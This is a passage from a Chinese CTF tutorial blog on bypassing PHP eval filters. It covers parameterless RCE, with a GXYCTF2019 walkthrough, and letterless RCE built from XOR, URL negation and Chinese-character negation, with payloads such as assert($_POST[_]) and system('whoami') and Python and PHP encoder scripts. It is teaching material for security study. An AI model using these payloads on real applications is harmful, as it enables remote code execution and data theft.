<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?exp=print_r(scandir(current(localeconv())));</span><br></pre></td></tr></table></figure>

<p><strong>取当前目录下指定文件(需爆破)</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?exp=print_r(array_rand(array_flip(scandir(current(localeconv())))));</span><br></pre></td></tr></table></figure>

<p><strong>读指定文件(需爆破)</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?exp=show_source(array_rand(array_flip(scandir(current(localeconv())))));</span><br></pre></td></tr></table></figure>

<p>一个小例题</p>
<h2 id="GXYCTF2019-禁止套娃"><a href="#GXYCTF2019-禁止套娃" class="headerlink" title="[GXYCTF2019]禁止套娃"></a>[GXYCTF2019]禁止套娃</h2><p><strong>.git</strong>泄露，<strong>Githack</strong>恢复，得到<strong>index.php</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;flag在哪里呢？&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[a-z,_]+\((?R)?\)/&#x27;</span>, <span class="literal">NULL</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/et|na|info|dec|bin|hex|oct|pi|log/i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">                <span class="comment">// echo $_GET[&#x27;exp&#x27;];</span></span><br><span class="line">                @<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;还差一点哦！&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;再好好想想！&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;还想读flag，臭弟弟！&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// highlight_file(__FILE__);</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>过滤了伪协议的无参数rce</p>
<h3 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h3><p><strong>session_id()</strong></p>
<p>因为过滤了<strong>hex</strong>和<strong>bin</strong>，所以就没办法使用<strong>hex2bin</strong>进行十六进制解码，不能直接执行命令，但告诉了flag在flag.php里面，所以可直接读取flag.php</p>
<p>可利用的函数</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>()</span><br><span class="line"><span class="title function_ invoke__">show_source</span>()</span><br><span class="line"><span class="title function_ invoke__">file</span>()</span><br><span class="line"><span class="title function_ invoke__">readfile</span>()</span><br></pre></td></tr></table></figure>

<p>payload</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?exp=<span class="title function_ invoke__">highlight_file</span>(<span class="title function_ invoke__">session_id</span>(<span class="title function_ invoke__">session_start</span>()));</span><br></pre></td></tr></table></figure>

<p>用burp截包将session改成如下：<code>PHPSESSID:payload</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images@main/image/202210081205728.png" alt="在这里插入图片描述"></p>
<h3 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h3><p><strong>getcwd()<strong>函数被过滤了，但是可以使用</strong>localeconv()</strong> 函数和**current()**函数来代替</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="keyword">echo</span> <span class="title function_ invoke__">current</span>(<span class="title function_ invoke__">localeconv</span>());</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">//返回&#x27;.&#x27;</span></span><br></pre></td></tr></table></figure>

<p>这样就可以继续使用**scandir()**了</p>
<p>查看当前目录</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?exp=<span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">current</span>(<span class="title function_ invoke__">localeconv</span>())));</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images@main/image/202210081205676.png" alt="在这里插入图片描述"></p>
<p>发现flag.php索引为3</p>
<h4 id="tips1"><a href="#tips1" class="headerlink" title="tips1"></a>tips1</h4><p>使用**array_rand()**函数</p>
<p>但是它取出的是数组的键，可使用<strong>array_flip()函数</strong>，把键与值交换</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Copy?exp=<span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">array_rand</span>(<span class="title function_ invoke__">array_flip</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">current</span>(<span class="title function_ invoke__">localeconv</span>())))));</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images@main/image/202210081208098.png" alt="image-20221008120850059"></p>
<p>读取flag文件</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?exp=<span class="title function_ invoke__">show_source</span>(<span class="title function_ invoke__">array_rand</span>(<span class="title function_ invoke__">array_flip</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">current</span>(<span class="title function_ invoke__">localeconv</span>())))));</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images@main/image/202210082244287.png" alt="image-20221008224433228"></p>
<h4 id="tips2"><a href="#tips2" class="headerlink" title="tips2"></a>tips2</h4><p>使用<code>array_reverse()</code>函数和<code>next()</code>函数，用<code>array_reverse()</code>函数将数组进行<strong>倒序</strong>，然后用<code>next()</code>函数指向索引<code>1</code>即<code>flag.php</code></p>
<p><strong>payload</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?exp=<span class="title function_ invoke__">highlight_file</span>(<span class="title function_ invoke__">next</span>(<span class="title function_ invoke__">array_reverse</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">current</span>(<span class="title function_ invoke__">localeconv</span>())))));</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images@main/image/202210081205725.png" alt="在这里插入图片描述"></p>
<h1 id="无字母数字rce"><a href="#无字母数字rce" class="headerlink" title="无字母数字rce"></a>无字母数字rce</h1><p>基本代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-z0-9]/is&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>])) &#123;</span><br><span class="line">  <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="php5和php7中的assert-函数"><a href="#php5和php7中的assert-函数" class="headerlink" title="php5和php7中的assert()函数"></a>php5和php7中的assert()函数</h2><p><strong>请注意</strong>：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.在PHP5中,assert()是一个函数，可以用形如`$a=assert;$a()`这样的形式来执行代码。但在PHP7中,官方对assert()函数进行了更改,让其变成了和eval()一样的语言结构,不再支持上面那种调用方法。</span><br><span class="line"></span><br><span class="line">2.PHP5不支持($a)()这种调用方式,形如&#x27;phpinfo&#x27;();但PHP7支持。</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images@main/image/202210081716713.png" alt="image-20221008171657662"></p>
<h2 id="异或"><a href="#异或" class="headerlink" title="异或"></a>异或</h2><p>PHP中，两个变量的值进行异或时，会先将两个变量的值转换为ASCII，再将ASCII转换为二进制数据，对两对二进制数据进行异或，异或完，再将结果转为ASCII，最后将ASCII转为字符串，即为最终结果。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> (<span class="string">&#x27;1&#x27;</span>^<span class="string">&#x27;b&#x27;</span>);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">output: S</span></span><br><span class="line"><span class="comment">(1)</span></span><br><span class="line"><span class="comment">1的ASCII值：49</span></span><br><span class="line"><span class="comment">b的ASCII值：98</span></span><br><span class="line"><span class="comment">(2)</span></span><br><span class="line"><span class="comment">65转为二进制：0110001</span></span><br><span class="line"><span class="comment">90转为二进制：1100010</span></span><br><span class="line"><span class="comment">(3)</span></span><br><span class="line"><span class="comment">二进制异或结果：1010011</span></span><br><span class="line"><span class="comment">二进制转为ASCII: 83</span></span><br><span class="line"><span class="comment">ASCII转为字符串：S</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>

<p>php异或脚本</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$shell</span> = <span class="string">&quot;assert&quot;</span>;</span><br><span class="line"><span class="variable">$result1</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="variable">$result2</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$num</span>=<span class="number">0</span>;<span class="variable">$num</span>&lt;=<span class="title function_ invoke__">strlen</span>(<span class="variable">$shell</span>);<span class="variable">$num</span>++)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$x</span>=<span class="number">33</span>;<span class="variable">$x</span>&lt;=<span class="number">126</span>;<span class="variable">$x</span>++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">judge</span>(<span class="title function_ invoke__">chr</span>(<span class="variable">$x</span>)))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="variable">$y</span>=<span class="number">33</span>;<span class="variable">$y</span>&lt;=<span class="number">126</span>;<span class="variable">$y</span>++)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span>(<span class="title function_ invoke__">judge</span>(<span class="title function_ invoke__">chr</span>(<span class="variable">$y</span>)))</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="variable">$f</span> = <span class="title function_ invoke__">chr</span>(<span class="variable">$x</span>)^<span class="title function_ invoke__">chr</span>(<span class="variable">$y</span>);</span><br><span class="line">                    <span class="keyword">if</span>(<span class="variable">$f</span> == <span class="variable">$shell</span>[<span class="variable">$num</span>])</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="variable">$result1</span> .= <span class="title function_ invoke__">chr</span>(<span class="variable">$x</span>);</span><br><span class="line">                        <span class="variable">$result2</span> .= <span class="title function_ invoke__">chr</span>(<span class="variable">$y</span>);</span><br><span class="line">                        <span class="keyword">break</span> <span class="number">2</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">judge</span>(<span class="params"><span class="variable">$c</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-z0-9]/is&#x27;</span>,<span class="variable">$c</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$result1</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;异或&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$result2</span>;</span><br></pre></td></tr></table></figure>

<p>python异或脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">encode</span>(<span class="params">command</span>):</span><br><span class="line">    code = <span class="string">&quot;~`!@#$%&amp;*()-=+_[]&#123;&#125;;:&lt;&gt;,.?/|&quot;</span></span><br><span class="line">    result_1 = <span class="string">&quot;&quot;</span></span><br><span class="line">    result_2 = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> command:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> command.isalpha():</span><br><span class="line">            result_1 += x</span><br><span class="line">            result_2 += x</span><br><span class="line">        <span class="keyword">for</span> y <span class="keyword">in</span> code:</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">chr</span>(<span class="built_in">ord</span>(x) ^ <span class="built_in">ord</span>(y)) <span class="keyword">in</span> code:</span><br><span class="line">                result_1 += y</span><br><span class="line">                result_2 += <span class="built_in">chr</span>(<span class="built_in">ord</span>(x) ^ <span class="built_in">ord</span>(y))</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">f&#x27;(&quot;<span class="subst">&#123;result_1&#125;</span>&quot; ^ &quot;<span class="subst">&#123;result_2&#125;</span>&quot;)&#x27;</span> </span><br><span class="line"></span><br><span class="line">a=encode(<span class="string">&#x27;ls&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(a)</span><br></pre></td></tr></table></figure>

<p><strong>测试</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">phpinfo =&gt; &quot;+(+).&amp;/&quot;^&quot;[@[@@@@&quot;</span><br></pre></td></tr></table></figure>

<p><strong>payload</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=$_=&quot;+(+).&amp;/&quot;^&quot;[@[@@@@&quot;;$_();</span><br></pre></td></tr></table></figure>

<p>因为+会被转成空格，所以需要url编码一下</p>
<p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images@main/image/202210081704849.png" alt="image-20221008170400767"></p>
<h2 id="url取反"><a href="#url取反" class="headerlink" title="url取反"></a>url取反</h2><p>原理</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">字符串 =&gt; ASCII码 =&gt; 二进制数据 =&gt; 取反 =&gt; ASCII码 =&gt; 字符串</span><br></pre></td></tr></table></figure>

<p><strong>测试</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(~<span class="string">&#x27;phpinfo&#x27;</span>);</span><br><span class="line"><span class="comment">//output: %8F%97%8F%96%91%99%90</span></span><br></pre></td></tr></table></figure>

<p><strong>payload</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=(~%<span class="number">8</span>F%<span class="number">97</span>%<span class="number">8</span>F%<span class="number">96</span>%<span class="number">91</span>%<span class="number">99</span>%<span class="number">90</span>)();</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images@main/image/202210081707338.png" alt="image-20221008170757263"></p>
<p><strong>一个小例子</strong></p>
<p>源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$code</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[A-Za-z0-9]+/&quot;</span>,<span class="variable">$code</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;NO.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    @<span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>异或</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_</span>=<span class="string">&quot;!((%)(&quot;</span>^<span class="string">&quot;@[[@[\\&quot;</span>; <span class="comment">//assert</span></span><br><span class="line"><span class="variable">$__</span>=<span class="string">&quot;!+/((&quot;</span>^<span class="string">&quot;~&#123;`&#123;|&quot;</span>; <span class="comment">//_POST</span></span><br><span class="line"><span class="variable">$___</span>=<span class="variable">$$__</span>; </span><br><span class="line"><span class="variable">$_</span>(<span class="variable">$___</span>[_]); <span class="comment">//assert($_POST[_]);</span></span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images@main/image/202210081719022.png" alt="image-20221008171907941"></p>
<p>在有system()等命令执行函数的情况下，我们完全可以直接利用，无需考虑php版本去构造assert，为自己找麻烦</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_</span>=<span class="string">&#x27;(&quot;((%-&#x27;</span>^<span class="string">&#x27;[[[\@@&#x27;</span>; <span class="comment">//system</span></span><br><span class="line"><span class="variable">$__</span>=<span class="string">&#x27;((/!-)&#x27;</span>^<span class="string">&#x27;_@@@@@&#x27;</span>; <span class="comment">//whoami</span></span><br><span class="line"><span class="variable">$_</span>(<span class="variable">$__</span>); <span class="comment">//system(&#x27;whoami&#x27;)</span></span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images@main/image/202210081730431.png" alt="image-20221008173013379"></p>
<p><strong>url取反</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=(~%<span class="number">8</span>C%<span class="number">86</span>%<span class="number">8</span>C%<span class="number">8</span>B%<span class="number">9</span>A%<span class="number">92</span>)(~%<span class="number">88</span>%<span class="number">97</span>%<span class="number">90</span>%<span class="number">9</span>E%<span class="number">92</span>%<span class="number">96</span>);  <span class="comment">//system(&#x27;whoami&#x27;);</span></span><br></pre></td></tr></table></figure>

<p>注意此时php版本&gt;7</p>
<p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images@main/image/202210081732606.png" alt="image-20221008173211563"></p>
<h2 id="汉字取反"><a href="#汉字取反" class="headerlink" title="汉字取反"></a>汉字取反</h2><p>思路时利用UTF-8编码的某个汉字，并将其中某个字符取出来，进行取反操作后获得相应字符</p>
<p><strong>POC</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$str</span> = <span class="string">&#x27;是夜静悄悄万物无声风淡淡的吹来带着一丝的凉意夏的炎热在夜晚消失无踪仰望天空天边几颗星子点缀着夜幕脚下每天走着的小路在今天犹独的寂静寂静得美丽喜欢这样的夜晚月光如水般的流泻当喧嚣隐入静寂灵动的清风牵引倦怠的心流连在杨柳岸边飘飞如风飞扬慢慢地走行走在从容的夜色里四处弥漫着水般的清澈不华丽不斑斓却让人感到超然迷离而妩媚风中依然有淡淡的花香那是季节留下的痕迹月色里树影婆娑暖暖的风摇动着花树晃动着默契的香清雅而朦胧在月夜里风情无限夜色澄明风清月朗旖旎成水墨云破月来花弄影风不定人初静明月红应满径我低吟着不知从那看来的诗句静静的感受月下悄然绽放的那份清雅凝眸看满天星辰碎成点点的斑驳落入远处那个小小的莲塘映着点点的水纯净而悠闲细碎的月光洒下一练银白映在花间化作晶莹的露斑驳美丽我沉醉沉醉于那份缥缈的雅致淡淡轻盈仿若烟雨的幽静空灵而悠远夜已深路幽情更浓我眷恋的看向明月那里一朵云絮轻纱般的飘过悄掩了月的羞涩一抹嫣然轻轻盈盈的舒展风柔月圆夜色正阑珊任凭月色洒落相思满地月色里记忆仿佛也变得透明在微风中舒展着自由弥漫着温馨温婉的月光覆盖着夜的清冷清凉的风肆意的吹过记忆的窗梦中的美丽等待的哀愁都沉浸在夜的幽静中风中远远的传来一声叹息那是明月把藏在心中的故事飘扬成风中一股清香细细碎碎浅浅淡淡借一缕风的情怀饮一盏清然缥缈和一曲人倚孤楼品一种淡然心情那轮月仿佛从远古的墨香里走来恬淡若水伴一缕细风悄然拢上飞扬的衣角和着月韵悠悠将心融入那份恬淡感受那种怡轻轻的将染香的心事放逐静静的任思绪迷离在浅凉如梦的月夜远处仿佛传来季节的花语心也开始聆听一卷书画半盏茶香细碎的影像随叹息放入心底珍藏几片花落痴醉了烟雨染湿了轻愁香染一地月华流泄点点微光于窗外摇曳旧梦遥遥在九月的夜里吹落清香一缕轻轻的随风潜入窗帷哀婉的蝉声穿透暗夜唱着浅秋的凄清眼神微黯凝眸一帘的心事化作风里的一缕忧伤落寞的倚着清籁的月光低落的时候为自己煮一壶浓浓的咖啡让那弥漫的香气渐渐的掩盖我的惆怅放一曲忧伤的音乐任凭那缕旋律在无声息间润湿了我的眼一个人在一杯咖啡的香气里静静的怀想你不会懂那份温情在沉寂的日子里让我迷离对着破碎的时光微笑看流年逝去看点点的愁绪与寂寥相知相惜一帘心事化作风里的一缕忧伤在温柔的月下迷离而又缠绵微蹙的眉里婉转着相思一如昨夜我又在静夜里手捧星光将思念放飞满怀的心思在星夜里缱绻无边淡淡的清幽随阙阙的哀愁从容的落入我的眸底顾盼中花开又一季你的温情穿过遥望的山水翩然的飞入小窗陪我浅吟低唱如水般的轻柔你的目光拴住了我的相思小手牵住了你给的温暖从此开始喜欢就这样开始沉迷本是陌路却不期而遇本应错过却注定相惜相聚的日子多了一份贪恋相伴的温暖让我忘记了早已预定的终点故事毕竟是故事终究是要落幕那份我所选择的幸福也只是在我的身边绕了一个圈然后走远总想让自己如花般开在你的眼中总想将自己的脉脉柔情放在你的手心你的身影却总是在我泪眼模糊时又渐渐飘远风一般的不留痕迹每天与相思结伴行走品茗时那份清香也仿如有你的味道带我闲步小庭用你的柔情淡化了我的愁绪当雨落轩窗花开满园我幻想着与你聆听带着期盼凝眸望向你来时的路见不到你的身影唯有时光踩着优雅的脚步款款而来身披月色独立于清冷你的身影重叠于旋绕的风中那份微笑依然留在弯弯的嘴角心却再也无法淡定如秋水清泪滴下时曾经的诺言一如隔世柔柔的情思放于心底默默地把那份关切敲成文字当我无依时你的幽雅你的淡然依然会在文字里带我的思绪悠然梦的路口是否可以让心依然守候等你飘而来再牵我的手一路前行今夜那份浅浅的忧伤注定搁浅在旧梦里&#x27;</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span>&lt;<span class="title function_ invoke__">mb_strlen</span>(<span class="variable">$str</span>, <span class="string">&#x27;utf-8&#x27;</span>); <span class="variable">$i</span>++)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$a</span> = <span class="title function_ invoke__">mb_substr</span>(<span class="variable">$str</span>, <span class="variable">$i</span>, <span class="number">1</span>, <span class="string">&#x27;utf-8&#x27;</span>);</span><br><span class="line">    <span class="variable">$b</span> = ~(<span class="variable">$a</span>);</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$b</span>[<span class="number">1</span>];</span><br><span class="line">    <span class="variable">$payload</span> = <span class="string">&#x27;a&#x27;</span>; <span class="comment">//单个单个字符获取</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$c</span>==<span class="variable">$payload</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$a</span>;<span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>payload</strong></p>
